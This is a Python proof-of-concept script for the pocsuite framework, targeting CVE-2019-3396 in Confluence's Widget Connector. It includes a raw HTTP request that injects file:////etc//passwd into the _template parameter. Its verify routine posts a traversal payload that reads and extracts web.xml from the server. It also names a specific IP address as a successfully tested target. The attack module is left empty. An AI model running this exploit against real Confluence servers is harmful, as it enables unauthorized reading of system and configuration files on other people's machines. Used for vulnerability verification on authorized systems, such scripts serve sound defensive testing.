#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2014-2015 pocsuite developers (http://seebug.org)
See the file 'docs/COPYING' for copying permission
"""
#命令行
from pocsuite import pocsuite_cli
#验证模块
from pocsuite import pocsuite_verify
#攻击模块
from pocsuite import pocsuite_attack
#控制台模式
from pocsuite import pocsuite_console
#requests 
from pocsuite.api.request import req
#register
from pocsuite.api.poc import register
#report
from pocsuite.api.poc import Output, POCBase

'''
POST /rest/tinymce/1/macro/preview HTTP/1.1
Host: 118.24.18.38:8090
Connection: close
X-Requested-With: XMLHttpRequest
Accept: application/json, text/javascript, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36
Referer: http://118.24.18.38:8090/pages/viewpage.action?pageId=66662&src=contextnavpagetreemode
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-US;q=0.7,ca;q=0.6
Content-Length: 175

{"contentId":"65601","macro":{"name":"widget","params":{"url":"https://www.viddler.com/v/23464dc5","width":"300","height":"200","_template":"file:////etc//passwd"},"body":""}}
'''

import requests
import re

#基础基类
class ConfluencPOC(POCBase):
    vulID = '59'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1' #默认为1
    vulDate = '2019-04-07' #漏洞公开的时间,不知道就写今天

    author = 'w7ay' #  PoC作者的大名
    createDate = '2019-04-07'# 编写 PoC 的日期
    updateDate = '2019-04-07'# PoC 更新的时间,默认和编写时间一样
    references = 'https://www.seebug.org/vuldb/ssvid-97898'# 漏洞地址来源,0day不用写
    name = 'Confluence Widget Connector path traversal (CVE-2019-3396)'# PoC 名称 
    appPowerLink = 'https://www.atlassian.com/software/confluence'# 漏洞厂商主页地址
    appName = 'Confluence'# 漏洞应用名称
    appVersion = 'more versions'# 漏洞影响版本
    vulType = 'Remote code execution'#漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        '2019 年 3 月 28 日，Confluence 官方发布预警 ，指出 Confluence Server 与 Confluence Data Center 中的 Widget Connector 存在服务端模板注入漏洞，攻击 者能利用此漏洞能够实现目录穿越与远程代码执行，同时该漏洞被赋予编号 CVE2019-3396
    ''' # 漏洞简要描述
    samples = ["http://118.24.18.38:8090"]# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    cvss = u"高危" #严重,高危,中危,低危

    #指纹方法
    def _fingerprint(self):
        pass
        
    #验证模块 pocsuite -r 59-Confluenc-path_traversal.py -u http://118.24.18.38:8090 --verify
    def _verify(self):
        #调用指纹方法
        result = {}
        output = Output()

        filename = "../web.xml"
        limitSize = 1000

        paylaod = self.url + "/rest/tinymce/1/macro/preview"
        headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0",
            "Referer": self.url,
            "Content-Type": "application/json; charset=utf-8"
        }
        data = '{"contentId":"786457","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc5","width":"1000","height":"1000","_template":"%s"}}}' % filename
        r = requests.post(paylaod, data=data, headers=headers)

        if r.status_code == 200 and "</web-app>" in r.text:
            m = re.search('<web-app[\s\S]+<\/web-app>', r.text)
            if m:
                content = m.group()[:limitSize]
                result['VerifyInfo'] = {}
                result['VerifyInfo']['url'] = filename
                result['VerifyInfo']['Payload'] = content
                #print result
        return self.save_output(result)

    #攻击模块
    def _attack(self):
        pass

    #输出报告
    def save_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

#注册类
register(ConfluencPOC)


